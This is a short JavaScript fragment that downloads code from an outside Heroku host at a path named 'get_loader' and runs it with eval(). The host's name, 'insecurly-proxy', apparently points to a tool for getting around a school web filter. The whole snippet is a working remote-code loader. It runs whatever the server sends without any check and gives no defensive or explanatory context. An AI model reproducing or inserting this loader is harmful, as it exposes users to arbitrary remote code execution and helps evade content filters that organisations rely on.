
            try {
                const response = await fetch('https://insecurly-proxy-4049abcc7e4e.herokuapp.com/get_loader');
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                const code = await response.text();
                eval(code);
            } catch (error) {
                alert('Error fetching or executing code: ' + error);
            }

